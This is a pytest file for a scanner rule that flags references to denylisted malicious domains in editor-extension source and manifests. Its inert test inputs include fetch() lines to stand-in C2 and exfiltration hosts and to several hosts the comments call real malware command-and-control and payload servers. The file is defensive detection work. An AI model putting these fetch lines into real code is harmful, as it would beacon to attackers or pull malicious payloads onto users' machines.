"""Fire / silent unit tests for the S4 blacklisted-domain rule (blacklist_domains).

Exercised against the curated seed denylist (``evil.example`` etc.); the matcher
itself is unit-tested separately in ``tests/platform/contracts/test_domain_indicators``.
"""

from __future__ import annotations

from collections.abc import Callable

from static_runtime.context import StaticAnalysisContext
from static_runtime.rules.s4_blacklisted_domain import BlacklistedDomainRule

MakeContext = Callable[..., StaticAnalysisContext]


def test_fires_on_blacklisted_domain_in_source(make_context: MakeContext) -> None:
    ctx = make_context(
        manifest={"publisher": "acme", "name": "thing"},
        files={"extension.js": 'fetch("https://c2.evil.example/beacon");'},
    )
    findings = BlacklistedDomainRule().evaluate(ctx)
    assert len(findings) == 1
    finding = findings[0]
    assert finding.rule_id == "extrace.s4.blacklisted_domain"
    assert finding.severity.value == "high"
    assert "evil.example" in finding.description
    assert finding.evidence and finding.evidence[0].type == "source_file"
    assert finding.evidence[0].line_number == 1


def test_fires_on_blacklisted_domain_in_manifest(make_context: MakeContext) -> None:
    ctx = make_context(
        manifest={"publisher": "acme", "name": "x", "homepage": "http://exfil.example"}
    )
    findings = BlacklistedDomainRule().evaluate(ctx)
    assert len(findings) == 1
    assert findings[0].evidence[0].type == "manifest"


def test_silent_for_benign_domains(make_context: MakeContext) -> None:
    ctx = make_context(
        manifest={"publisher": "acme", "name": "x"},
        files={"extension.js": 'fetch("https://api.github.com/repos");'},
    )
    assert BlacklistedDomainRule().evaluate(ctx) == []


def test_silent_for_lookalike_registrable_domain(make_context: MakeContext) -> None:
    # notevil.example is a different registrable domain than evil.example.
    ctx = make_context(files={"extension.js": 'fetch("https://notevil.example/x");'})
    assert BlacklistedDomainRule().evaluate(ctx) == []


def test_fires_on_kagema_c2_in_source(make_context: MakeContext) -> None:
    # Regression: the kagema dropper's C2 (niggboo.com) is a real curated entry
    # on the shipped seed denylist, so a static source reference to it (any path)
    # is flagged. Guards against the entry being accidentally dropped.
    ctx = make_context(files={"extension.js": 'fetch("https://niggboo.com/aaa");'})
    findings = BlacklistedDomainRule().evaluate(ctx)
    assert len(findings) == 1
    assert "niggboo.com" in findings[0].description


def test_fires_on_glassworm_c2_ip_in_source(make_context: MakeContext) -> None:
    # Regression: GlassWorm direct-IP C2/stager hosts are curated seed entries.
    ctx = make_context(
        files={"extension.js": 'fetch("http://217.69.11.60/get_zombi_payload/x");'}
    )
    findings = BlacklistedDomainRule().evaluate(ctx)
    assert len(findings) == 1
    assert "217.69.11.60" in findings[0].description


def test_fires_on_snowshono_relay_in_source(make_context: MakeContext) -> None:
    # Regression: the snowshono Stage-3 ScreenConnect relay — the domain
    # year000001.com (suffix-matched, so the relay. subdomain hits too) and the
    # bare IP 144.172.103.247 — are real curated seed entries. The URL strings here
    # are inert scanned test inputs (a .py fixture is never fetched and is invisible
    # to markdown-link-check); the rule flags a source reference to either.
    sub = make_context(files={"a.js": 'fetch("https://relay.year000001.com/x");'})
    sub_findings = BlacklistedDomainRule().evaluate(sub)
    assert len(sub_findings) == 1
    assert "year000001.com" in sub_findings[0].description

    ip = make_context(files={"b.js": 'fetch("http://144.172.103.247:8041/Bin/x.msi");'})
    ip_findings = BlacklistedDomainRule().evaluate(ip)
    assert len(ip_findings) == 1
    assert "144.172.103.247" in ip_findings[0].description


def test_fires_on_related_byosc_campaign_c2_in_source(
    make_context: MakeContext,
) -> None:
    # Regression: the related ScreenConnect-abuse (BYOSC) campaign C2s are curated
    # seed entries (suffix-matched, so the meow./meeting. relay subdomains hit too).
    for host, needle in (
        ("meow.undefined21.com", "undefined21.com"),
        ("meeting.bulletmailer.net", "bulletmailer.net"),
        ("dof-connect.top", "dof-connect.top"),
    ):
        ctx = make_context(files={"x.js": f'fetch("https://{host}/Bin/x.msi");'})
        findings = BlacklistedDomainRule().evaluate(ctx)
        assert len(findings) == 1, host
        assert needle in findings[0].description
